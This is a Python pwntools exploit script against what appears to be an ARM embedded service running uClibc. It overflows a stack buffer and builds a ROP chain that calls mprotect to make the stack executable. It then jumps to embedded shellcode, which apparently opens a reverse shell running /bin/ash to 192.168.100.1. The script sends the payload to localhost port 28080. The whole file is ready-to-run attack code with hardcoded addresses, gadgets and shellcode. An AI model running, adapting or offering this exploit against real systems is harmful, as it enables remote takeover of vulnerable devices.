from pwn import *
import pwnlib.util.packing


STACK_BASE = 0xbefdf000
STACK_SIZE = 0xbf000000 - STACK_BASE
BASE_ADDRESSES = {
    "libgcc": 0x40018000,
    "uClibc": 0x40000000
}
GADGETS = {
    "libgcc": {
        "pop {x0, x1, x2, x3}": 0x5578
    },
    "uClibc": {
        "mprotect": 0x1ecc
    }
}
SHELLCODE_ADDRESS = 0xbeffe9f8


SHELLCODE = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x81\x46\x10\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x81\xb0\x69\x46\x04\x22\x03\x27\x48\x46\x01\xdf\x10\x4b\x00\x9c\x63\x40\xf9\xd1\x02\x21\x3f\x27\x48\x46\x01\xdf\x01\x39\xfb\xd5\x82\xb0\x52\x40\x01\x92\x06\xa1\xca\x70\x00\x91\x05\xa0\x02\x72\x69\x46\x0b\x27\x01\xdf\xff\xff\x02\xff\xcd\x80\xc0\xa8\x64\x01\x61\x73\x68\xff\x2f\x62\x69\x6e\x2f\x61\x73\x68\xff\xff\xff\xff\x63\x64\x38\x30"


def gadget(lib, key):
    ret = BASE_ADDRESSES[lib] + GADGETS[lib][key]
    print(f"[+] Generated gadget {hex(ret)} in lib {lib} for key {key}")
    return ret


def main():
    payload = SHELLCODE + (b"\xAA" * (0x1024 - len(SHELLCODE)))
    payload += pwnlib.util.packing.pack(gadget("libgcc", "pop {x0, x1, x2, x3}"), 32, "little")
    payload += pwnlib.util.packing.pack(STACK_BASE, 32, "little")
    payload += pwnlib.util.packing.pack(STACK_SIZE, 32, "little")
    payload += pwnlib.util.packing.pack(0x7, 32, "little")
    payload += pwnlib.util.packing.pack(0xdeadbeef, 32, "little")

    payload += pwnlib.util.packing.pack(gadget("uClibc", "mprotect"), 32, "little")
    payload += pwnlib.util.packing.pack(0xdeadbeef, 32, "little")
    payload += pwnlib.util.packing.pack(0xdeadbeef, 32, "little")
    payload += pwnlib.util.packing.pack(0xdeadbeef, 32, "little")

    payload += pwnlib.util.packing.pack(SHELLCODE_ADDRESS, 32, "little")

    io = tubes.remote.remote("localhost", 28080, typ="tcp")
    io.send(payload)


if __name__ == "__main__":
    main()
